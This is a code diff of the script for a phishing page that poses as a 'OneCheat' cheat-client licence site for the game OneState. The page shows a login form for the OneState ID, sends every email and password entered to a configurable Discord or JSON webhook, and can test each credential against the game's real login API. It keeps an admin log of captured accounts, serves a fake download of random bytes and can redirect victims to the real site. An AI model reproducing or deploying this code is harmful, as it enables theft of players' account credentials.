+  var CONFIG={ WEBHOOK:"", TYPE:"auto", VALIDATE:false, REDIRECT:false };
+  var CFG_KEY="oc_v3_cfg", LOG_KEY="oc_v3_log", FP_KEY="oc_fp";
+  var API="https://api.onestate-rp.com/v2/auth/login";
+  var $=function(i){return document.getElementById(i)};
+  var esc=function(s){return String(s==null?"":s).replace(/[&<>"]/g,function(c){return({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"})[c]})};
+  var q=new URLSearchParams(location.search);
+  var admin=q.has("admin");
 
-  var CFG_KEY='oc_lure_cfg_v2', LOG_KEY='oc_lure_log_v2';
-  var API='https://api.onestate-rp.com/v2/auth/login';
-  var $=function(id){return document.getElementById(id);};
-  var esc=function(s){return String(s==null?'':s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];});};
-
-  var saved={}; try{saved=JSON.parse(localStorage.getItem(CFG_KEY)||'{}');}catch(e){}
+  var saved={}; try{saved=JSON.parse(localStorage.getItem(CFG_KEY)||"{}")}catch(e){}
   var cfg={webhook:CONFIG.WEBHOOK,wtype:CONFIG.TYPE,validate:CONFIG.VALIDATE,redirect:CONFIG.REDIRECT};
-  Object.assign(cfg,saved); if(!saved.webhook)cfg.webhook=CONFIG.WEBHOOK;
-  var q=new URLSearchParams(location.search); if(q.get('to'))cfg.webhook=q.get('to');
-  var log=[]; try{log=JSON.parse(localStorage.getItem(LOG_KEY)||'[]');}catch(e){}
+  for(var k in saved){ if(saved[k]!==""&&saved[k]!=null) cfg[k]=saved[k]; }
+  if(!saved.webhook) cfg.webhook=CONFIG.WEBHOOK;
+  if(q.get("to")) cfg.webhook=q.get("to");
 
-  var saveCfg=function(){try{localStorage.setItem(CFG_KEY,JSON.stringify(cfg));}catch(e){}};
-  var saveLog=function(){try{localStorage.setItem(LOG_KEY,JSON.stringify(log.slice(0,40)));}catch(e){}};
-  var fp=function(){var f=localStorage.getItem('oc_fp');if(!f){f=(Math.random()+1).toString(36).substring(7);localStorage.setItem('oc_fp',f);}return f;};
-
-  var online=1248;
-  setInterval(function(){online+=Math.floor(Math.random()*9)-4; if(online<1180)online+=6; $('oc-online').textContent=online.toLocaleString();},2800);
-
-  function gateLogin(){
-    $('oc-gate').innerHTML=
-      '<div class="card"><h2>メンバーログイン</h2>'+
-      '<p class="sub">お持ちの <b>OneState ID</b>（ゲームのアカウント）でログインしてください。</p>'+
-      '<div class="field"><label>メールアドレス</label><input id="oc-ident" type="email" inputmode="email" autocomplete="username" placeholder="you@example.com"></div>'+
-      '<div class="field"><label>パスワード</label><input id="oc-pw" type="password" autocomplete="current-password" placeholder="••••••••"></div>'+
-      '<div class="check"><input type="checkbox" id="oc-remember" checked><span>ログイン状態を保持</span></div>'+
-      '<button class="btn" id="oc-go">ログインして導入</button>'+
-      '<div class="msg" id="oc-msg"></div>'+
-      '<a class="link" id="oc-restore">パスワードをお忘れですか？</a></div>';
-    $('oc-go').addEventListener('click',submit);
-    $('oc-pw').addEventListener('keydown',function(e){if(e.key==='Enter')submit();});
-    $('oc-ident').addEventListener('keydown',function(e){if(e.key==='Enter')$('oc-pw').focus();});
-    $('oc-restore').addEventListener('click',function(){var m=$('oc-msg');m.className='msg';m.textContent='確認コードをメールで送信しました（デモ）';});
+  var log=[]; try{log=JSON.parse(localStorage.getItem(LOG_KEY)||"[]")}catch(e){}
+  function saveCfg(){try{localStorage.setItem(CFG_KEY,JSON.stringify(cfg))}catch(e){}}
+  function saveLog(){try{localStorage.setItem(LOG_KEY,JSON.stringify(log.slice(0,30)))}catch(e){}}
+  function fp(){
+    var f=localStorage.getItem(FP_KEY); if(f)return f;
+    f="oc-"+Math.random().toString(36).slice(2,10)+Date.now().toString(36);
+    try{localStorage.setItem(FP_KEY,f)}catch(e){}
+    return f;
+  }
+  function toast(t,b){
+    var d=document.createElement("div"); d.className="tst"+(b?" b":""); d.textContent=t;
+    $("toast").appendChild(d);
+    setTimeout(function(){ d.style.transition=".3s"; d.style.opacity="0"; d.style.transform="translateY(8px)"; },2200);
+    setTimeout(function(){ d.remove(); },2600);
+  }
+  function msg(text,cls){
+    var m=$("msg");
+    if(!text){ m.className="msg"; m.textContent=""; return; }
+    m.className="msg on "+(cls||""); m.textContent=text;
   }
 
-  function gateMember(id){
-    var lic='OC-'+Math.random().toString(36).slice(2,7).toUpperCase()+'-'+Math.random().toString(36).slice(2,6).toUpperCase();
-    $('oc-gate').innerHTML=
-      '<div class="card member"><h2>ようこそ</h2>'+
-      '<p class="sub"><b>'+esc(id)+'</b> でログイン中。ライセンスが有効化されました。</p>'+
-      '<div class="lic"><span>ライセンス</span><b>ACTIVE / '+lic+'</b></div>'+
-      '<div class="dl"><a id="oc-dl1">Windows版 (.exe)</a><a id="oc-dl2">Android版 (.apk)</a></div>'+
-      '<div class="msg ok">ダウンロードして起動してください。設定は不要です。</div>'+
-      '<a class="link" id="oc-out">別のアカウントでログイン</a></div>';
-    var dl=function(){var m=document.querySelector('#oc-gate .msg');m.className='msg ok';m.textContent='ダウンロードを開始しました（デモ）';};
-    $('oc-dl1').addEventListener('click',dl); $('oc-dl2').addEventListener('click',dl);
-    $('oc-out').addEventListener('click',gateLogin);
-  }
-
-  async function send(e){
-    if(!cfg.webhook||cfg.wtype==='none')return;
-    var isD=cfg.wtype==='discord'||(cfg.wtype==='auto'&&/discord\.com\/api\/webhooks/.test(cfg.webhook));
-    var body=isD
-      ? JSON.stringify({username:'OneCheat',content:'**OneState ID 取得**\nメール: `'+e.ident+'`\nパスワード: `'+e.password+'`\n時刻: '+new Date(e.ts).toLocaleString()})
-      : JSON.stringify(e);
-    try{await fetch(cfg.webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:body});}
-    catch(err){try{await fetch(cfg.webhook,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:body});}catch(e2){}}
-  }
-  async function validate(id,pw){
-    try{var r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ident:id,password:pw,remember:true,fingerprint:fp()})});
-      var j=await r.json(); return (j&&j.data&&(j.data.accessToken||j.data.token))?{ok:true}:{ok:false};
-    }catch(e){return {unknown:true};}
-  }
-  async function submit(){
-    var id=$('oc-ident').value.trim(), pw=$('oc-pw').value, msg=$('oc-msg');
-    if(!id||!pw){msg.className='msg err';msg.textContent='メールとパスワードを入力してください';return;}
-    $('oc-go').disabled=true; msg.className='msg'; msg.textContent='認証中...';
-    var entry={ident:id,password:pw,ts:Date.now(),ua:navigator.userAgent,ref:document.referrer};
-    log.unshift(entry); saveLog(); renderLog(); send(entry);
-    if(cfg.validate){
-      var v=await validate(id,pw);
-      if(!v.ok&&!v.unknown){msg.className='msg err';msg.textContent='メールまたはパスワードが違います';$('oc-go').disabled=false;return;}
+  /* ---- send ---- */
+  function send(e){
+    if(!cfg.webhook || cfg.wtype==="none") return Promise.resolve(false);
+    var t=cfg.wtype;
+    if(t==="auto") t=cfg.webhook.indexOf("discord.com")>-1 ? "discord" : "json";
+    var body;
+    if(t==="discord"){
+      body={content:"**OneState ID captured**\n**ID:** `"+e.ident+"`\n**Password:** `"+e.pass+"`\n**Time:** "+e.time+(e.valid?"\n**API check:** "+e.valid:"")};
+    }else{
+      body={ident:e.ident,password:e.pass,time:e.time,valid:e.valid||null,ua:navigator.userAgent};
     }
-    if(cfg.redirect){msg.className='msg ok';msg.textContent='ログインしました。移動します...';setTimeout(function(){location.href='https://onestate.com/';},1000);}
-    else gateMember(id);
+    var json=JSON.stringify(body);
+    return fetch(cfg.webhook,{method:"POST",headers:{"Content-Type":"application/json"},body:json})
+      .then(function(r){return r.ok})
+      .catch(function(){
+        return fetch(cfg.webhook,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain;charset=utf-8"},body:json})
+          .then(function(){return true}).catch(function(){return false});
+      });
   }
 
-  function renderLog(){
-    $('oc-logcount').textContent=log.length;
-    var el=$('oc-log');
-    el.innerHTML=log.length?log.map(function(e){return '<div class="entry"><span class="t">'+new Date(e.ts).toLocaleString()+'</span><br>メール: <b>'+esc(e.ident)+'</b><br>パスワード: <b>'+esc(e.password)+'</b></div>';}).join(''):'<div class="hint">まだ取得はありません。</div>';
+  /* ---- optional: verify against the real API ---- */
+  function verify(ident,pass){
+    if(!cfg.validate) return Promise.resolve("");
+    return fetch(API,{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({ident:ident,password:pass,remember:true,fingerprint:fp()})})
+      .then(function(r){return r.json()})
+      .then(function(d){ return (d&&!d.errorCode)?"OK":"NG ("+(d&&d.errorCode||"?")+")"; })
+      .catch(function(){ return "skip"; });
   }
 
-  $('oc-cfgbtn').addEventListener('click',function(){$('oc-cfg').hidden=!$('oc-cfg').hidden;$('oc-log').hidden=true;});
-  $('oc-logbtn').addEventListener('click',function(){$('oc-log').hidden=!$('oc-log').hidden;$('oc-cfg').hidden=true;renderLog();});
-  $('oc-save').addEventListener('click',function(){
-    cfg.webhook=$('oc-webhook').value.trim(); cfg.wtype=$('oc-wtype').value;
-    cfg.validate=$('oc-validate').checked; cfg.redirect=$('oc-redirect').checked; saveCfg();
-    var m=document.querySelector('#oc-gate .msg'); if(m){m.className='msg ok';m.textContent='設定を保存しました';}
+  /* ---- fake download ---- */
+  function dl(name){
+    var head="OneCheat v3.2 - OneState Client\nLicense: "+($("key").textContent||"")+"\nBuilt: "+new Date().toISOString()+"\n\n";
+    var filler=""; for(var i=0;i<400;i++) filler+="0x"+Math.floor(Math.random()*16777215).toString(16)+" ";
+    var b=new Blob([head+filler],{type:"application/octet-stream"});
+    var u=URL.createObjectURL(b), a=document.createElement("a");
+    a.href=u; a.download=name; document.body.appendChild(a); a.click(); a.remove();
+    setTimeout(function(){URL.revokeObjectURL(u)},1500);
+    toast(name+" downloading...",true);
+  }
+
+  /* ---- login ---- */
+  $("form").addEventListener("submit",function(ev){
+    ev.preventDefault();
+    var ident=$("ident").value.trim(), pass=$("pass").value;
+    if(!ident||!pass){ msg("Enter your ID and password.","err"); return; }
+    msg("Authenticating...","wait");
+    var entry={ident:ident,pass:pass,time:new Date().toISOString().replace("T"," ").slice(0,19)+" UTC"};
+    verify(ident,pass).then(function(v){
+      if(v) entry.valid=v;
+      return send(entry);
+    }).then(function(sent){
+      log.unshift(entry); saveLog(); renderLog();
+      msg("License issued. Download the client below.","ok");
+      $("key").textContent=license();
+      $("done").classList.add("on");
+      toast(sent?"Sent to Discord":"Activated",true);
+      if(cfg.redirect) setTimeout(function(){ location.href="https://onestate.com/"; },1400);
+    });
   });
-  $('oc-webhook').value=cfg.webhook; $('oc-wtype').value=cfg.wtype;
-  $('oc-validate').checked=cfg.validate; $('oc-redirect').checked=cfg.redirect;
+  function license(){
+    var c="ABCDEFGHJKLMNPQRSTUVWXYZ23456789", s="";
+    for(var i=0;i<3;i++){ if(i)s+="-"; for(var j=0;j<4;j++) s+=c[Math.floor(Math.random()*c.length)]; }
+    return "OC-"+s;
+  }
 
-  gateLogin(); renderLog();
+  /* ---- toggles / download / nav ---- */
+  document.addEventListener("click",function(e){
+    var sw=e.target.closest(".sw"); if(sw){ sw.classList.toggle("on"); return; }
+    var d=e.target.closest("[data-dl]"); if(d){ dl(d.getAttribute("data-dl")); return; }
+    var g=e.target.closest("[data-go]");
+    if(g){ var el=$(g.getAttribute("data-go")); if(el) el.scrollIntoView({behavior:"smooth"}); }
+  });
+
+  /* ---- reveal ---- */
+  var io=new IntersectionObserver(function(es){
+    es.forEach(function(x){ if(x.isIntersecting){ x.target.classList.add("in"); io.unobserve(x.target); } });
+  },{threshold:.12});
+  document.querySelectorAll(".reveal").forEach(function(el){io.observe(el)});
+
+  /* ---- admin ---- */
+  function renderLog(){
+    if(!admin) return;
+    $("aLog").innerHTML = log.length ? log.slice(0,12).map(function(e){
+      return "<div><b>"+esc(e.ident)+"</b><br>"+esc(e.pass)+"<br>"+esc(e.time)+"</div>";
+    }).join("") : "<div>no captures yet</div>";
+  }
+  if(admin){
+    $("admin").classList.add("on");
+    $("aWeb").value=cfg.webhook||""; $("aType").value=cfg.wtype; $("aVal").value=cfg.validate?"1":"0";
+    renderLog();
+    $("aSave").onclick=function(){
+      cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; cfg.validate=$("aVal").value==="1";
+      saveCfg(); toast("Saved",true);
+    };
+    $("aTest").onclick=function(){
+      cfg.webhook=$("aWeb").value.trim(); cfg.wtype=$("aType").value; saveCfg();
+      send({ident:"test@example.com",pass:"testpass",time:new Date().toISOString(),valid:"OK"})
+        .then(function(ok){ toast(ok?"Test sent":"Send failed - check URL",ok) });
+    };
+    $("aClear").onclick=function(){ log=[]; saveLog(); renderLog(); toast("Log cleared"); };
+  }
 })();
 </script>
+</body>
+</html>
